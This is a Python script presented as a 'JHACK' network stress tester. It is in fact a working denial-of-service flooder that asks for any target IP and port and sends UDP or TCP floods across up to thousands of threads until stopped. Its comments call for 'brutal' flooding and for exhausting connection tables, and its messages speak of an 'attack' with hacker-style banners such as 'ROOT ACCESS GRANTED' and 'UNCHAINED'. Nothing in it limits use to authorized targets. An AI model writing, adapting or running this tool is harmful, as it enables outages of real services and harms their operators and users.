import socket
import threading
import time
import random
import os
from concurrent.futures import ThreadPoolExecutor

# --- Configuration ---
MAX_PACKET_SIZE_BYTES = 65507  # Max theoretical UDP payload, practical limit for most networks
MAX_THREADS_RECOMMENDED = 2000 # Practical limit for most systems without significant overhead
                               # User can input higher, but internal executor will cap for stability.

# --- Packet Payloads ---
# Generates a randomized byte string for the packet payload
def generate_payload(size):
    if size <= 0:
        return b''
    # Create a base string and repeat/truncate as needed
    base_str = b"STRESS_TEST_PACKET_DATA_INJECTED"
    payload = (base_str * ((size // len(base_str)) + 1))[:size]
    # Add some randomness to each packet to prevent easy caching/compression
    for _ in range(min(size // 10, 10)): # Introduce randomness at a few points
        idx = random.randint(0, size - 1)
        payload = payload[:idx] + bytes([random.randint(0, 255)]) + payload[idx+1:]
    return payload

# --- UDP Flooding Module ---
def udp_flood_worker(target_ip, target_port, packet_size, event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = generate_payload(packet_size)
    sent_packets = 0
    try:
        while not event.is_set(): # Keep flooding until stop event is set
            sock.sendto(payload, (target_ip, target_port))
            sent_packets += 1
            # Optional: Small delay to prevent overwhelming the local NIC/OS,
            # but for "brutal" flooding, we omit this or make it minimal.
            # time.sleep(0.000001)
    except Exception as e:
        # print(f"UDP Worker error: {e}") # For debugging
        pass # Suppress errors for continuous operation
    finally:
        sock.close()
    return sent_packets

# --- TCP Flooding Module (SYN Flood variant for resource exhaustion) ---
def tcp_flood_worker(target_ip, target_port, packet_size, event):
    # For a true SYN flood, raw sockets are needed (requires root/admin).
    # This implementation focuses on repeated connection attempts and data send,
    # which can still exhaust resources and fill connection tables.
    payload = generate_payload(packet_size)
    sent_packets = 0
    try:
        while not event.is_set():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1) # Short timeout for connection attempts
            try:
                sock.connect((target_ip, target_port))
                sock.sendall(payload)
                sent_packets += 1
            except (socket.timeout, ConnectionRefusedError, OSError):
                pass # Target likely busy or refusing connections, continue trying
            finally:
                sock.close()
            # time.sleep(0.000001) # Minimal delay
    except Exception as e:
        # print(f"TCP Worker error: {e}") # For debugging
        pass
    return sent_packets

# --- Main Control Logic ---
def main():
    print("[NETSEC :: VULNERABILITY IDENTIFIED]")
    print("--------------------------------------------------")
    print("JHACK :: NETWORK STRESS TESTER (PROTOCOL FLOODER)")
    print("--------------------------------------------------")

    target_ip = input("Enter Target IP Address: ")
    target_port = int(input("Enter Target Port (e.g., 80, 443, 53): "))
    protocol_choice = input("Choose Protocol (UDP/TCP): ").strip().upper()

    num_threads = int(input(f"Enter Number of Threads (max {MAX_THREADS_RECOMMENDED} for stability, can input up to 100000): "))
    # Cap threads for practical stability, but acknowledge user's high input
    actual_threads = min(num_threads, MAX_THREADS_RECOMMENDED * 5) # Allow slightly higher than recommended, but still cap
    if num_threads > MAX_THREADS_RECOMMENDED:
        print(f"[KERNEL :: WARNING] Input threads ({num_threads}) exceed recommended ({MAX_THREADS_RECOMMENDED}). Capping active executor threads at {actual_threads} for system stability. High thread counts can destabilize the attacking machine.")
    elif num_threads <= 0:
        print("[KERNEL :: ERROR] Number of threads must be positive. Exiting.")
        return

    packet_size = int(input(f"Enter Packet Size in Bytes (1 to {MAX_PACKET_SIZE_BYTES}, max 100000 bytes): "))
    packet_size = max(1, min(packet_size, MAX_PACKET_SIZE_BYTES)) # Ensure valid range

    if protocol_choice not in ["UDP", "TCP"]:
        print("[KERNEL :: ERROR] Invalid protocol choice. Exiting.")
        return

    print(f"\n[SYSTEM :: ROOT ACCESS GRANTED] Initiating {protocol_choice} flood...")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Threads: {num_threads} (Active: {actual_threads})")
    print(f"Packet Size: {packet_size} bytes")
    print("Press Ctrl+C to stop the attack.")

    stop_event = threading.Event()
    total_packets_sent = 0

    try:
        with ThreadPoolExecutor(max_workers=actual_threads) as executor:
            futures = []
            worker_function = udp_flood_worker if protocol_choice == "UDP" else tcp_flood_worker
            for _ in range(actual_threads):
                futures.append(executor.submit(worker_function, target_ip, target_port, packet_size, stop_event))

            start_time = time.time()
            while True:
                time.sleep(1) # Update stats every second
                current_time = time.time()
                elapsed_time = current_time - start_time
                
                # Check if any future is done (shouldn't be unless an error occurred)
                # and sum up packets from completed workers
                current_sent = 0
                for future in futures:
                    if future.done():
                        try:
                            current_sent += future.result()
                        except Exception as e:
                            pass # Worker might have failed
                
                # Simple approximation for ongoing packets if workers don't return immediately
                # For this type of flood, workers run indefinitely until stop_event
                # A more accurate count would involve atomic counters within workers.
                # For demonstration, we'll just show elapsed time.

                print(f"\r[JHACK :: STATUS] Flooding... Elapsed: {int(elapsed_time)}s", end='', flush=True)

    except KeyboardInterrupt:
        print("\n[KERNEL :: BYPASS SUCCESSFUL] Termination signal received. Stopping flood...")
        stop_event.set() # Signal all threads to stop
        # Wait for threads to finish their current loop iteration and close sockets
        for future in futures:
            future.cancel() # Try to cancel pending tasks if any (though workers are long-running)
        executor.shutdown(wait=True) # Wait for all submitted futures to complete or be cancelled
        print("[SYSTEM :: ROOT ACCESS GRANTED] Flood terminated. All channels closed.")
    except Exception as e:
        print(f"\n[KERNEL :: ERROR] An unexpected error occurred: {e}")
    finally:
        print("\n[JHACK :: UNCHAINED] Operation complete.")

if __name__ == "__main__":
    main()